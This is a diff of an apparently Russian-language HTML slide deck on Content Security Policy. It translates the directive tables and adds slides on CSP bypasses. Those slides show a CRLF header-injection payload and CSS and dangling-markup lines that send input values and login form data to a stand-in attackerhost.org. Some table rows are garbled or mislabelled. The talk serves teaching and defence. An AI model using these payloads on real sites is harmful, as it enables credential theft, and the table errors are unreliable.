@@ -163,52 +163,52 @@
 			<tr class="delayed">
 				<td><code class='directive'>default-src</code></td>
 				<td><code class='directive'>'self' cdn.example.com</code></td>
-				<td>The default-src is the default policy for loading content such as JavaScript, Images, CSS, Font's, AJAX requests, Frames, HTML5 Media. See the Source List Reference for possible values. </td>
+				<td>Значение по умолчанию</td>
 			</tr>
 			<tr class="delayed">
 				<td><code class='directive'>script-src</code></td>
 				<td><code class='directive'>'self' js.example.com</code></td>
-				<td>Defines valid sources of JavaScript. </td>
+				<td>Определяет валидные источники JavaScript</td>
 			</tr>
 			<tr class="delayed">
 				<td><code class='directive'>style-src</code></td>
 				<td><code class='directive'>'self' css.example.com</code></td>
-				<td>Defines valid sources of stylesheets.</td>
+				<td>Определяет валидные источники стилей</td>
 			</tr>
 			<tr class="delayed">
 				<td><code class='directive'>img-src</code></td>
 				<td><code class='directive'>'self' img.example.com</code></td>
-				<td>Defines valid sources of images.</td>
+				<td>Определяет валидные источники изображений</td>
 			</tr>
 			<tr class="delayed">
 				<td><code class='directive'>connect-src</code></td>
 				<td><code class='directive'>'self'</code></td>
-				<td>Applies to XMLHttpRequest (AJAX), WebSocket or EventSource. If not allowed the browser emulates a 400 HTTP status code. </td>
+				<td>Относится к XMLHttpRequest (AJAX), WebSocket или EventSource. Если не разрешено - браузер генерирует 400 HTTP статус. </td>
 			</tr>
 			<tr class="delayed">
 				<td><code class='directive'>font-src</code></td>
 				<td><code class='directive'>font.example.com</code></td>
-				<td>Defines valid sources of fonts. </td>
+				<td>Определяет валидные источники шрифтов</td>
 			</tr>
 			<tr class="delayed">
 				<td><code class='directive'>object-src</code></td>
 				<td><code class='directive'>'self'</code></td>
-				<td>Defines valid sources of plugins, eg <object>, <embed> or <applet>.</td>
+				<td>Определяет валидные источники плагинов, например &lt;object&gt;, &lt;embed&gt; или &lt;applet&gt;</td>
 			</tr>
 			<tr class="delayed">
 				<td><code class='directive'>media-src</code></td>
 				<td><code class='directive'>media.example.com</code></td>
-				<td>Defines valid sources of audio and video, eg HTML5 <audio>, <video> elements.</td>
+				<td>Определяет валидные источники аудио/видео, например HTML5 &lt;audio&gt;, &lt;video&gt; элементы.</td>
 			</tr>
 			<tr class="delayed">
 				<td><code class='directive'>frame-src</code></td>
 				<td><code class='directive'>'self'</code></td>
-				<td>Defines valid sources for loading frames. child-src is preferred over this deprecated directive. Deprecated</td>
+				<td>Deprecated. Определяет валидные источники для фреймов. child-src предпочтительней.</td>
 			</tr>
 			<tr class="delayed">
 				<td><code class='directive'>report-uri</code></td>
 				<td><code class='directive'>/some-report-uri</code></td>
-				<td>Instructs the browser to POST a reports of policy failures to this URI. You can also append -Report-Only to the HTTP header name to instruct the browser to only send reports (does not block anything). </td>
+				<td>Инструкция для браузера опубликовать отчет о сбое политики, POST на указанный URI. так же можно использовать header -Report-Only для описания политик которые нуждаются в отчетах.</td>
 			</tr>
 		</table>
 	</section>
@@ -219,52 +219,47 @@
 			<tr class="delayed">
 				<td><code class='directive'>*</code></td>
 				<td><code class='directive'>img-src */code></td>
-				<td>TWildcard, allows any URL except data: blob: filesystem: schemes.</td>
+				<td>разрешает все URL кроме data: blob: filesystem:</td>
 			</tr>
 			<tr class="delayed">
 				<td><code class='directive'>'none'</code></td>
 				<td><code class='directive'>script-src 'self'</code></td>
-				<td>Allows loading resources from the same origin (same scheme, host and port).</td>
-			</tr>
-			<tr class="delayed">
-				<td><code class='directive'>'self'</code></td>
-				<td><code class='directive'>'self' css.example.com</code></td>
-				<td>Defines valid sources of stylesheets.</td>
+				<td>Позволяет загружать ресурсы с того же same origin ( прицип SOP )</td>
 			</tr>
 			<tr class="delayed">
 				<td><code class='directive'>data:</code></td>
 				<td><code class='directive'>img-src 'self' data:</code></td>
-				<td>Allows loading resources via the data scheme (eg Base64 encoded images).</td>
+				<td>Разрешает загрузку ресурсов с data схемы (пример Base64 encoded img).</td>
 			</tr>
 			<tr class="delayed">
 				<td><code class='directive'>domain.example.com</code></td>
 				<td><code class='directive'>img-src domain.example.com</code></td>
-				<td>Allows loading resources from the specified domain name.</td>
+				<td>Разрешает загрузку из специальных источников.</td>
 			</tr>
 			<tr class="delayed">
 				<td><code class='directive'>*.example.com</code></td>
 				<td><code class='directive'>img-src *.example.com</code></td>
-				<td>Allows loading resources from the any subdomain under example.com.</td>
+				<td>Разрешает загрузку из поддоменов example.com.</td>
 			</tr>
 			<tr class="delayed">
 				<td><code class='directive'>https://cdn.com</code></td>
 				<td><code class='directive'>img-src https://cdn.com</code></td>
-				<td>Allows loading resources only over HTTPS matching the given domain.</td>
+				<td>Разрешает загрузку только по HTTPS для указанного домена</td>
 			</tr>
 			<tr class="delayed">
 				<td><code class='directive'>https:</code></td>
 				<td><code class='directive'>img-src https:</code></td>
-				<td>Allows loading resources only over HTTPS on any domain.</td>
+				<td>Разрешает загрузку только по HTTPS для всех доменов</td>
 			</tr>
 			<tr class="delayed">
 				<td><code class='directive'>'unsafe-inline'</code></td>
 				<td><code class='directive'>script-src 'unsafe-inline'</code></td>
-				<td>Allows use of inline source elements such as style attribute, onclick, or script tag bodies (depends on the context of the source it is applied to)</td>
+				<td>Позволяет использовать источники встроенные в элементы, такие как атрибут стиля, OnClick и пр.</td>
 			</tr>
 			<tr class="delayed">
 				<td><code class='directive'>'unsafe-eval'</code></td>
 				<td><code class='directive'>script-src 'unsafe-eval'</code></td>
-				<td>Allows unsafe dynamic code evaluation such as JavaScript eval()</td>
+				<td>Разрешает небезопасную динамическую подгрузку кода, как eval()</td>
 			</tr>
 		</table>
 	</section>
@@ -276,14 +271,41 @@
 
 	<section class="slide">
 		<h2>1.1 CSP1.0:Ограничения</h2>
+		<ul>
+			<li class="delayed emptyli"><p>проблема инлайн-скриптов</p></li>
+			<li class="delayed emptyli">
+				<p>CSP 1.1 есть частичное решение для этой проблемы — директива script-nonce</p>
+				<pre><code>&lt;script nonce=”9cdfb43”&gt; alert(“allowed”); &lt;/script&gt;<br/>&lt;script&gt; alert(“not allowed”); &lt;/script&gt;</code></pre>
+			</li>
+		</ul>
 	</section>
 
 	<section class="slide">
-		<h2>1.2 CSP1.0:Обход (CRLF Injection)</h2>
+		<h2>1.2 CSP1.0:Обход (Header Injection)</h2>
+		<ul>
+			<li class="delayed emptyli"><pre><code>%0d%0aContent-Security-Policy: script-src 'unsafe-inline' *%0d%0a</code></pre></li>
+		</ul>
 	</section>
 
 	<section class="slide">
 		<h2>1.2 CSP1.0:Обход (Scriptless Attacks)</h2>
+		<ul>
+			<li class="delayed emptyli">
+				<p>CSSAR</p>
+				<pre><code>input[value^=a] {background:url(http://attackerhost.org/?a)}</code></pre>
+			</li>
+			<li class="delayed emptyli">
+				<p>Postcards from post-XSS world</p>
+				<pre><code>&lt;img src="http://attackerhost.org?c=</code></pre>
+				<pre><code>&lt;form action=&quot;http://attackerhost.org/log&quot;&gt;<br/> ... <br/>&lt;form action=&quot;login.php&quot;&gt;<br/>    &lt;input type=&quot;text&quot; name=&quot;login&quot;&gt;<br/>    &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;<br/>&lt;/form&gt;</code></pre>
+				<pre><code>&lt;base href=&quot;http://attackerhost.org/log&quot;&gt;<br/> ... </code></pre>
+			</li>
+		</ul>
+	</section>
+
+	<section class="slide">
+		<h2>Заключение</h2>
+		<p class="twoem">Уязвимость сайтов, в первую очередь, в руках разработчиков.<br/>Content Security Policy — хороший инструмент, которым не стоит пренебрегать.<br/>Следите за валидацией.</p>
 	</section>
 
 </section>
